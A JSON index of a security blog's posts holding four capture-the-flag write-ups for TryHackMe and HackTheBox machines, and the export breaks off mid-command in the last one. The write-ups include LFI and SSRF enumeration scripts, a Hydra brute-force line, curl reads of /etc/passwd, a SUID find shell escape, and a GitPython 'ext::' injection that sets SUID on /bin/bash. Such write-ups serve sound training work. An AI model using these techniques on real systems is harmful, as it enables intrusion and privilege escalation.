[ { "title": "Airplane TryHackMe", "url": "/posts/Airplane-TryHackMe/", "categories": "tryhackme, writeup", "tags": "scripting, gdbserver, SUID Permission, ruby", "date": "2024-07-19 00:00:00 +0800", "snippet": "AirplaneAirplane is a medium-difficulty machine on TryHackMe. It begins with an LFI (Local File Inclusion) vulnerability, allowing us to enumerate server processes through /proc/cmdline. This leads us to a gdbserver service, which we exploit to gain initial access. Once inside as the user Hudson, we discover a file with SUID permissions belonging to Carlos. We use this to escalate privileges to Carlos’s shell. Additionally, we find that Ruby scripts can be executed with sudo, which we abuse via directory traversal to execute our own code.ReconWe start with NMAP scan.PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE=| 256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8=| 256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb8000/tcp open http-alt syn-ack Werkzeug/3.0.2 Python/3.8.10| http-methods: |_ Supported Methods: OPTIONS HEAD GET| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND| Server: Werkzeug/3.0.2 Python/3.8.10| Date: Fri, 19 Jul 2024 14:43:19 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 207| Connection: close| &lt;!doctype html&gt;| &lt;html lang=en&gt;| &lt;title&gt;404 Not Found&lt;/title&gt;| &lt;h1&gt;Not Found&lt;/h1&gt;| &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;| GetRequest: | HTTP/1.1 302 FOUND| Server: Werkzeug/3.0.2 Python/3.8.10| Date: Fri, 19 Jul 2024 14:43:13 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 269| Location: http://airplane.thm:8000/?page=index.html| Connection: close| &lt;!doctype html&gt;| &lt;html lang=en&gt;| &lt;title&gt;Redirecting...&lt;/title&gt;| &lt;h1&gt;Redirecting...&lt;/h1&gt;| &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"http://airplane.thm:8000/?page=index.html\"&gt;http://airplane.thm:8000/?page=index.html&lt;/a&gt;. If not, click the link.| Socks5: | &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"| \"http://www.w3.org/TR/html4/strict.dtd\"&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;| &lt;title&gt;Error response&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Error response&lt;/h1&gt;| &lt;p&gt;Error code: 400&lt;/p&gt;| &lt;p&gt;Message: Bad request syntax ('| ').&lt;/p&gt;| &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;| &lt;/body&gt;|_ &lt;/html&gt;|_http-server-header: Werkzeug/3.0.2 Python/3.8.10|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.94SVN%I=7%D=7/19%Time=669A7B81%P=x86_64-pc-linux-gnu%rThe web application on port 8000 have GET Parameter that vulnerable to Local File Inclusion(LFI). Below shows that ‘/etc/passwd’ can be read thru the GET Parameter.We can leverage the vulnerability to explore more about the server. This includes searching for any private keys within user home directories or sensitive information in the root folder. Unfortunately, these attempts did not yield any useful results. However, Local File Inclusion (LFI) is a significant vulnerability that allows an attacker to read, include, or execute files on the application server. By examining the Linux system files, we can gather valuable information about the server environment.The LFI vulnerability reveals Hudson’s home directory, which we already identified through /etc/passwd. A crucial file to check when encountering LFI is /proc/cmdline. This file can help us enumerate the server’s processes. Below is a crafted script to automate this enumeration:import requestsurl = \"http://airplane.thm:8000/\"# ID in /proc/cmdlinewith open(\"result.txt\",\"w\") as f: for i in range(1,1000): x = requests.get(\"{}?page=../../../../../..//proc/{}/cmdline\".format(url,i)) if x.text not in \"Page not found\": print(f\"[+] Try {i} : \" + x.text) print(\"[+] Saving output\") f.write(f\"Output for {i}:\\n\") f.write(x.text) f.write(\"\\n\\n\")Below shows that a GDBServer have been run in port 6048 and the PID for the /proc/cmdline is 530. We can use this information to enumerate more about the GDBServer.We can search for GDBServer hacktricks or exploit. After validate all the found resource we can see that a way to upload a craft elf file to get the foothold. We can follow the step thru the hacktricks blogs. Below is the way we can do it to gain the foothold.Hudson ShellUse the find command to list all the SUID file in the host server. We found the find binary file have the SUID Permission hence we can abuse it to escalate to other user./usr/bin/find . -exec /bin/sh -p \\; -quitCarlos ShellWe discovered that the user Carlos can run a Ruby (.rb) file with sudo without requiring a password. To bypass the restrictions on the Ruby file, we can use directory traversal to execute our own code. Here is the Proof Of Concept to gain root privileges:We gain root and pwn all the user. Thank you for reading :)" }, { "title": "Editorial Hackthebox", "url": "/posts/Editorial-Hackthebox/", "categories": "hackthebox, writeup", "tags": "Gitpython, scripting, SSRF", "date": "2024-07-13 00:00:00 +0800", "snippet": "EditorialEditorial is a Season 5 machine from Week 9 on HackTheBox. It is considered an easy box, but the enumeration phase requires careful attention. The host has two open ports, one of which is an HTTP port. We discovered a file upload function with a book URL input that connects to our Python web server. This function allows us to identify an internal port. After gaining initial access, we found a .git repository containing user credentials. A Python script can be executed with sudo permissions by that user, leading to root access via an exploit found in the Python script’s library.ReconWe start with an NMAP scan.PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=| 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://editorial.htb| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFrom the web application, we find a file upload function. The highlighted part in the image below is the injection point where we can access the internal port.The URL input connects to our Python web server once supplied, as shown in the screenshot below of my local IP.I tried various file types to upload to the server. However, the application does not allow access to the uploaded files. Using Burp Suite, we can see that an image is returned from the localhost URL, allowing us to enumerate the internal ports.Craft a script to make it easier to enumerate each port and the response.import requestsdef file_upload(ports): url = \"http://editorial.htb/upload-cover\" headers = { \"Host\": \"editorial.htb\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------2558739193374546790339287871\", \"Origin\": \"http://editorial.htb\", \"Connection\": \"close\", \"Referer\": \"http://editorial.htb/upload\" } data = ( \"-----------------------------2558739193374546790339287871\\r\\n\" 'Content-Disposition: form-data; name=\"bookurl\"\\r\\n\\r\\n' f\"http://127.0.0.1:{ports}/\\r\\n\" \"-----------------------------2558739193374546790339287871\\r\\n\" 'Content-Disposition: form-data; name=\"bookfile\"; filename=\"test.txt\"\\r\\n' \"Content-Type: text/plain\\r\\n\\r\\n\" \"test content\\r\\n\" \"-----------------------------2558739193374546790339287871--\\r\\n\" ) x = requests.post(url,headers=headers,data=data) return x.status_code, x.textport = range(4000,5500)for ports in port: status_code, text = file_upload(ports) if text not in \"/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg\": print(f\"[+] Port {ports} : Status code = {status_code} &amp; Response = {text}\") else: print(f\"[+] Port {ports}: Same response\")The result show that the response of the port 5000 is different from the other port. It gave us a new endpoint we can look at it.We explore the new endpoint using Burp Suite.The content of “/api/latest/metadata/messages/authors” endpoint reveals credentials.Using the credentials, we SSH into the server.dev ShellIn the dev home directory, we find a .git repo in the /apps directory. We view the git log for the repo.Using the “git show” command, we see the content of the git log.prod shellRunning sudo -l shows that our current user can run a Python script as root.The result shows that a python script can be run as root. We can review the python script and look for any information that we can use.#!/usr/bin/python3import osimport sysfrom git import Repoos.chdir('/opt/internal_apps/clone_changes')url_to_clone = sys.argv[1]r = Repo.init('', bare=True)r.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])We discover an RCE vulnerability in the git library gitPython. Checking the git version with pip list reveals the installed library.Exploiting this vulnerability, we craft a malicious command to grant /bin/bash file SUID permission.The command used:sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% +s% /bin/bash'Thank you for reading." }, { "title": "Backdoor Hackthebox", "url": "/posts/Backdoor-Hackthebox/", "categories": "hackthebox, writeup", "tags": "meterpreter, local file inclusion, screen, vulnerable plugins, screen", "date": "2021-12-18 10:00:00 +0800", "snippet": "BackdoorBackdoor is an easy machine from Hackthebox. We start from finding wordpress website then have a vulnerable plugins. The plugins is vulnerable to directory traversal and it allows local file inclusion. From this we can get the config file where it contents database credentials. Then with local file inclusion we can get a valid process that run gdbserver. Use metasploit to get reverse shell with meterpreter. From there we find a SUID binary where we can exploit and gain root.ReconNmap scanPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=| 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;#8211; Real-LifeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 22:48Completed NSE at 22:48, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 22:48Completed NSE at 22:48, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 22:48Completed NSE at 22:48, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.036KB)Got port 22 and 80 in nmap scan. So we can proceed to enumerate http port. The web app is powered by wordpress. Wp-admin pageThe basic enumeration for http is we can brute force the directory with many tools in kali linux. Use the gobuster and got something that we can check.root@Rav3nCLaW [10:26:04 AM] [~/Documents/htb/backdoor] -&gt; # cat gobuster_80.out /index.php (Status: 301) [Size: 0] [--&gt; http://backdoor.htb/]/wp-content (Status: 301) [Size: 317] [--&gt; http://backdoor.htb/wp-content/]/wp-login.php (Status: 200) [Size: 5674]/license.txt (Status: 200) [Size: 19915]/wp-includes (Status: 301) [Size: 318] [--&gt; http://backdoor.htb/wp-includes/]/readme.html (Status: 200) [Size: 7346]/wp-trackback.php (Status: 200) [Size: 135]/wp-admin (Status: 301) [Size: 315] [--&gt; http://backdoor.htb/wp-admin/]/xmlrpc.php (Status: 405) [Size: 42]&gt; # gobuster dir -u http://backdoor.htb/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://backdoor.htb/wp-content/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,txt,html,js[+] Timeout: 10s===============================================================2021/12/03 10:23:20 Starting gobuster in directory enumeration mode===============================================================/index.php (Status: 200) [Size: 0]/themes (Status: 301) [Size: 324] [--&gt; http://backdoor.htb/wp-content/themes/]/uploads (Status: 301) [Size: 325] [--&gt; http://backdoor.htb/wp-content/uploads/]/plugins (Status: 301) [Size: 325] [--&gt; http://backdoor.htb/wp-content/plugins/]/upgrade (Status: 301) [Size: 325] [--&gt; http://backdoor.htb/wp-content/upgrade/]From the results we can see new directory. Then check the page of /plugins and found new things.ebook-download ?? so decided to google it and if i can find some exploit about the ebook.Found the exploit that maybe works for the box.Just to confirm that the exploit can be use. Check the reaadme.txt and find the version of the ebook-downloadThe stable tag is 1.1 and it is indeed that is the exploit that can be use. After we apply the lfi in exploit db we can get the wp-config.phpwp-config.php file is sensitive file for wordpress and it maybe contains some database credentials. Since wp-config.php is downloaded, the mysql credentials we can get it.// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8' );/** The database collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );The credentials maybe for the db but worth a try to test it at the login page of wp-admin So i intend to brute force the post form with hydra and get the result.hydra -L /usr/share/wordlists/SecLists/Usernames/Names/names.txt -p \"MQYBJSaD#DxG6qbm\" backdoor.htb http-post-form \"/wp-admin/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbackdoor.htb%2Fwp-admin%2F&amp;testcookie=1:S=302\" -f Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-03 10:54:59[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task[DATA] attacking http-post-form://backdoor.htb:80/wp-admin/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbackdoor.htb%2Fwp-admin%2F&amp;testcookie=1:S=302[80][http-post-form] host: backdoor.htb login: abbas password: MQYBJSaD#DxG6qbm[STATUS] attack finished for backdoor.htb (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 10:55:02FootholdUnfortunately the credentials is not valid to the login page. Then run curl command to grab /etc/passwd and it works.root@Rav3nCLaW [04:08:32 PM] [~/Documents/htb/backdoor] -&gt; # curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=/etc/passwd/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinuser:x:1000:1000:user:/home/user:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false&lt;script&gt;window.close()&lt;/script&gt;#Try take user id_rsa but cannot take it and start googling about LFI.Found something useful in LFI vulnerability.From the above image, /proc/[PID]/cmdline is kinda interesting since we have users but not the passwords. Need to fuzz the PIDroot@Rav3nCLaW [10:43:36 PM] [~/Documents/htb/backdoor] -&gt; # wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/3-digits-000-999.txt -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=/proc/FUZZ/cmdline --hw 1 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdlineTotal requests: 1000=====================================================================ID Response Lines Word Chars Payload =====================================================================000000849: 200 0 L 12 W 183 Ch \"848\" 000000846: 200 0 L 11 W 181 Ch \"845\" 000000851: 200 0 L 5 W 148 Ch \"850\" 000000885: 200 0 L 3 W 128 Ch \"884\" 000000884: 200 0 L 8 W 138 Ch \"883\" 000000990: 200 0 L 5 W 145 Ch \"989\" Total time: 4.972168Processed Requests: 1000Filtered Requests: 994Requests/sec.: 201.1194We find some PID and we can check all the PID thru the curl command that we use to output /etc/passwd. We got gdbserver configuration from the /proc/845/cmdlineroot@Rav3nCLaW [10:48:26 PM] [~/Documents/htb/backdoor] -&gt; # curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=/proc/845/cmdline -o procfile1.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 181 100 181 0 0 1601 0 --:--:-- --:--:-- --:--:-- 1601root@Rav3nCLaW [10:48:30 PM] [~/Documents/htb/backdoor] -&gt; # cat procfile1.txt /proc/845/cmdline/proc/845/cmdline/proc/845/cmdline/bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done&lt;script&gt;window.close()&lt;/script&gt;Found the exploitdb and in metasploit. The exploitDB have the version of gdbserver but as for the metasploit it does not mention about the version so try the metasploit gdb exploit first.Metasploit gdbserver exploitMeterpreter shellCannot ssh because user do not have the .ssh directory. In the meterpreter collect information about the system with find command.Privelege Escalationuser@Backdoor:~$ find / -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/at/usr/bin/su/usr/bin/sudo/usr/bin/newgrp/usr/bin/fusermount/usr/bin/screen/usr/bin/umount/usr/bin/mount/usr/bin/chsh/usr/bin/pkexecWith linpeas we can the screen version.Since the screen file have SUID permission we can just attach to the root.screen -x root/root" }, { "title": "Secret Hackthebox", "url": "/posts/Secret-Hackthebox/", "categories": "hackthebox, writeup", "tags": ".git, JWT token, source code review, core dump", "date": "2021-11-26 00:00:00 +0800", "snippet": "SecretSecret is an easy machine on Hackthebox. Started with .git expose and use gittools to extract the repository. Review the source code from the repository and found lot of endpoints. The JSON Web Token will be generate and it help us to manipulate and perform remote code execution then use to get reverse shell. To escalate to root then we need to code review of c program. From that we find that we need to crash the program then it allows us to see the content of the memory via core dump. Then can get the root flag.ReconPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=| 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: DUMB Docs3000/tcp open http syn-ack ttl 63 Node.js (Express middleware)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelCheck the http web and found some download button and it shows that the download button have source code.In the unzip file we can see the .git dir so we can extract it with gitTools. https://github.com/internetwache/GitToolsThe extractor section will extract commits and their content from a broken repository.Extract the source code from the commitsExtract all the commit source code need to do enumeration. We got lot of endpoint and do not know how to exploit. In forgot.js file we see the a condition to check the name of the user.private.js file have have the check role condition where if the user is theadmin we can get the flag??#private.jsif (name == 'theadmin'){ res.json({ role:{ role:\"you are admin\", desc : \"{flag will be here}\" } }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) }})Theres a file which is verifytoke.js who verify jwt token and the code shows that to pass the verify token we need to have TOKEN_SECRET. Since .env have the token_secret maybe we can bypass the verification.#verifytoken.js const jwt = require(\"jsonwebtoken\");module.exports = function (req, res, next) { const token = req.header(\"auth-token\"); if (!token) return res.status(401).send(\"Access Denied\"); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(\"Invalid Token\"); }};First of all we can see the /login and /register so we need to register first then this will generate the jwt token from our credentials.#auth.jsrouter.post('/register', async (req, res) =&gt; { // validation const { error } = registerValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if user exists const emailExist = await User.findOne({email:req.body.email}) if (emailExist) return res.status(400).send('Email already Exist') // check if user name exist const unameexist = await User.findOne({ name: req.body.name }) if (unameexist) return res.status(400).send('Name already Exist') //hash the password const salt = await bcrypt.genSalt(10); const hashPaswrod = await bcrypt.hash(req.body.password, salt) //create a user const user = new User({ name: req.body.name, email: req.body.email, password:hashPaswrod }); try{ const saveduser = await user.save(); res.send({ user: user.name}) } catch(err){ console.log(err) } });The /login check all the information if its valid also check the jwt token too.#auth.jsrouter.post('/login', async (req , res) =&gt; { const { error } = loginValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if email is okay const user = await User.findOne({ email: req.body.email }) if (!user) return res.status(400).send('Email is wrong'); // check password const validPass = await bcrypt.compare(req.body.password, user.password) if (!validPass) return res.status(400).send('Password is wrong'); // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header('auth-token', token).send(token);Try curl command and it always return the page of the website. The command is#It always return source code of the page.curl -X POST http://10.10.11.120/login -H 'Content-Type: application/json' -d '{\"name\":\"theadmin\",\"email\":\"theadmin@dasith.works\",\"password\":\"admin1234\"}'I wonder what is wrong so i check again all the source code file. Found in index.js theres an api that has been declare and it for all the file in /routes/auth .// import routs const authRoute = require('./routes/auth'); &lt;&lt;&lt;const webroute = require('./src/routes/web')dotenv.config();//connect db mongoose.connect(process.env.DB_CONNECT, { useNewUrlParser: true }, () =&gt; console.log(\"connect to db!\"));//middle ware app.use(express.json());app.use('/api/user',authRoute) &lt;&lt;&lt;app.use('/api/', privRoute)app.use('/', webroute)FootholdThats when i realize need to add /api/user .#Output of the curl command with the APIcurl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d 